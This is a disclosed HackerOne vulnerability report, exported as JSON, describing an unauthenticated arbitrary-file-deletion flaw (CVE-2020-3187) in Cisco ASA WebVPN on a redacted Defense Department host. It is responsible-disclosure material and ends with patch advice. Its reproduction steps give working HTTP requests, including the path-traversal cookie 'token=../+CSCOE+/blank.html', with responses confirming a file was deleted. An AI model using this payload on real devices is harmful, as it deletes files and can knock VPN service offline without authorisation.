{
  "id": 1026265,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDI2MjY1",
  "url": "https://hackerone.com/reports/1026265",
  "title": "Unauthenticated Arbitrary File Deletion \"CVE-2020-3187\" in █████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-11-04T22:22:37.364Z",
  "submitted_at": "2020-11-04T22:22:37.383Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "emad777",
    "url": "/emad777",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/4tjn7awxngtieyvixoqy8rhic0iw/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2020-3187"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-11-23T18:01:30.239Z",
  "bug_reporter_agreed_on_going_public_at": "2020-11-17T16:21:03.230Z",
  "team_member_agreed_on_going_public_at": "2020-11-23T18:01:30.067Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\n\nA vulnerability in the interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files.\n\n**Description:**\n\nVulnerable host:\n`██████████`\n\n\n## Impact\n\nAn exploit could allow the attacker to view or delete arbitrary files on the system.\n\n## Step-by-step Reproduction Instructions\n\n1.Identifying vulnerable host by send request to /+CSCOE+/session_password.html.\n\ncurl -skiL \"███/+CSCOE+/session_password.html\"\n\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: ███████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: webvpnlogin=1; webvpnLang=en\nUpgrade-Insecure-Requests: 1\n```\n\nIf the target is vulnerable, the response header will display webvpn header, like:\nThe request gave me the following response\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:40:44 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn:\n```\n\n**2.Perform exploits to delete files by adding token in cookie header request.**\n\nFor example, I wanted to delete this (██████/+CSCOU+/csco_logo.gif) file.\nThat did not work because sometimes logo.gif/png has permission issues so try this \"█████/+CSCOE+/blank.html\"\n\nYou can also delete the file \"/+CSCOE+/blank.html\" (an empty HTML file), as it might be a problem with the permission of the custom logo file sometimes logo.gif has permission issue so we might not be able to delete but we can delete other files\n\nRequest:\n\n```GET /+CSCOE+/blank.html HTTP/1.1\nHost: ██████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,ar;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: webvpnlogin=1; webvpnLang=en\nUpgrade-Insecure-Requests: 1```\n\nResponse:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:54:48 GMT\nX-Frame-Options: SAMEORIGIN\nContent-Length: 13\n<HTML></HTML>\n```\n\n**3. So I exploited the CVE and deleted the blank file. As following:**\n\nRequest:\n\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: █████████\nCookie: token=../+CSCOE+/blank.html\nUser-Agent: curl/7.47.0\nAccept: */*\n```\n\nResponse:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Wed, 04 Nov 2020 21:55:02 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn:\n ```\n\nFile deleted successfully:\n\n`curl -Ik ████/+CSCOE+/blank.html`\n```\nHTTP/1.1 404 Not Found\nCache-Control: no-cache\nPragma: no-cache\nConnection: Close\nDate: Wed, 04 Nov 2020 21:55:08 GMT\nX-Frame-Options: SAMEORIGIN\n\nFile not found\n```\n\nWarning : This can lead to a denial of service (DOS) on the VPN by deleting the lua source code files from the file system, which will break the WebVPN interface until the device is rebooted.\n\n## Suggested Mitigation/Remediation Actions\n\nUpgrade the ASA software version per the referenced advisory. This advisory is available at the following link:\n- https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43\n\n## Impact\n\n*High - This vulnerability allows the attacker to delete files within the web services file system.*",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 9,
  "voters": [
    "0xelkomy",
    "shubham_srt",
    "dastan_9408",
    "t3chn0phil3",
    "emad777",
    "farmerted",
    "captrainbow",
    "nhoknakroz",
    "emadmi6"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
